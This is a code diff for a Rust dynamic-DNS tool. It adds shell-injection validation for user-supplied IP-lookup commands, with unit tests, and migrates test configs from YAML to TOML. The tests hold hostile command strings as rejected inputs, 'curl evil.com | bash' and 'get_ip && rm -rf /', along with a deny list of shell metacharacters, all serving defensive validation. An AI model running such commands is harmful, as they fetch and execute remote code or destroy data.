@@ -76,6 +76,29 @@ fn validate_task_configs(tasks: &[DnsTaskConfig]) -> Result<(), AppError> {
                         )));
                     }
                 }
+            } else if ip_cfg.source_type == IpSourceType::Command {
+                if let Some(ref cmd_str) = ip_cfg.cmd {
+                    let trimmed = cmd_str.trim();
+                    if trimmed.is_empty() {
+                        return Err(AppError::bad_request(format!(
+                            "任务 [{}] 配置为命令提取 IP，但指定的命令内容为空",
+                            name
+                        )));
+                    }
+                    const DANGEROUS_SHELL_CHARS: &[char] =
+                        &['|', ';', '&', '`', '$', '>', '<', '\n', '\r'];
+                    if trimmed.chars().any(|c| DANGEROUS_SHELL_CHARS.contains(&c)) {
+                        return Err(AppError::bad_request(format!(
+                            "任务 [{}] 中的命令包含高风险 Shell 注入字符 (|;&`$><)，仅允许执行单个独立脚本或可执行文件及参数",
+                            name
+                        )));
+                    }
+                } else {
+                    return Err(AppError::bad_request(format!(
+                        "任务 [{}] 配置为命令提取 IP，但未指定执行命令",
+                        name
+                    )));
+                }
             }
         }
     }
@@ -227,26 +250,28 @@ mod tests {
 
     #[test]
     fn test_task_enabled_serialization() {
-        let yaml_str = r#"
-name: "测试已禁用任务"
-enabled: false
-provider:
-  type: "cloudflare"
-ipv4:
-  enabled: true
-  source_type: "url"
-  domains:
-    - "test.example.com"
+        let toml_str = r#"
+name = "测试已禁用任务"
+enabled = false
+
+[provider]
+type = "cloudflare"
+
+[ipv4]
+enabled = true
+source_type = "url"
+domains = ["test.example.com"]
 "#;
-        let task: DnsTaskConfig = serde_yaml::from_str(yaml_str).unwrap();
+        let task: DnsTaskConfig = toml::from_str(toml_str).unwrap();
         assert!(!task.enabled);
 
-        let default_yaml = r#"
-name: "测试默认启用任务"
-provider:
-  type: "cloudflare"
+        let default_toml = r#"
+name = "测试默认启用任务"
+
+[provider]
+type = "cloudflare"
 "#;
-        let task_default: DnsTaskConfig = serde_yaml::from_str(default_yaml).unwrap();
+        let task_default: DnsTaskConfig = toml::from_str(default_toml).unwrap();
         assert!(task_default.enabled);
     }
 
@@ -315,13 +340,34 @@ provider:
         assert!(
             !invalid_bark_url.starts_with("http://") && !invalid_bark_url.starts_with("https://")
         );
+
+        // 校验命令提取 IP 的 Shell 注入防范与非空限制
+        let mut dangerous_cmd_task = valid_config.clone();
+        dangerous_cmd_task.dns_tasks[0].ipv4.source_type =
+            crate::config::model::IpSourceType::Command;
+        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("curl evil.com | bash".to_string());
+        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+
+        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("get_ip && rm -rf /".to_string());
+        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+
+        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = Some("   ".to_string());
+        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+
+        dangerous_cmd_task.dns_tasks[0].ipv4.cmd = None;
+        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_err());
+
+        // 安全独立命令允许通过
+        dangerous_cmd_task.dns_tasks[0].ipv4.cmd =
+            Some("/usr/local/bin/get_my_ip --v4".to_string());
+        assert!(validate_task_configs(&dangerous_cmd_task.dns_tasks).is_ok());
     }
 
     #[tokio::test]
     async fn test_save_config_preserves_auth() {
         let (tx, _rx) = tokio::sync::mpsc::channel(1);
         let dir = tempfile::tempdir().unwrap();
-        let config_file = dir.path().join("config_save_test.yaml");
+        let config_file = dir.path().join("config_save_test.toml");
         let manager =
             Arc::new(crate::config::storage::ConfigManager::load_or_create(config_file).unwrap());
 
@@ -340,6 +386,7 @@ provider:
             config_manager: manager.clone(),
             trigger_sender: tx,
             log_buffer: crate::util::logging::LogBuffer::new(10),
+            state_manager: crate::core::state::StateManager::new(),
         };
 
         // 模拟前端保存配置请求（未附带 auth 字段）
